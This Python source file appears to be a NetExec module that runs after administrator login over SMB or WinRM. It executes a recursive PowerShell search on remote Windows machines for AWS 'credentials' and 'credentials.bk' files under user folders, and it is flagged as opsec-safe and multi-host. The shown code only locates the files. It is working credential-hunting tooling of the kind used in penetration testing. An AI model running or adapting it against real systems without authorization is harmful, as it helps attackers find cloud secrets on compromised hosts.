from csv import reader


class NXCModule:
    """
    Search for aws credentials file on windows machines

    Module by Fortress
    """

    name = "aws-credentials"
    description = "Search for aws credentials files."
    supported_protocols = ["smb", "winrm"]
    opsec_safe = True
    multiple_hosts = True

    def __init__(self):
        self.search_path = "'C:\\Users\\'"

    def options(self, context, module_options):
        r"""
        SEARCH_PATH     Comma-separated locations where to search for aws credentials related files 
                        (you must add single quotes around the paths if they include spaces)
                        Default: 'C:\\Users\\'
        """
        if "SEARCH_PATH" in module_options:
            self.search_path = module_options["SEARCH_PATH"]

    def on_admin_login(self, context, connection):

        # search for aws_credentials-related files
        search_aws_creds_files_payload = f"Get-ChildItem -Path {self.search_path} -Recurse -Force -Include ('credentials','credentials.bk') -ErrorAction SilentlyContinue | Select FullName -ExpandProperty FullName"
        search_aws_creds_files_cmd = f'powershell.exe "{search_aws_creds_files_payload}"'
        search_aws_creds_files_output = connection.execute(search_aws_creds_files_cmd, True)
    
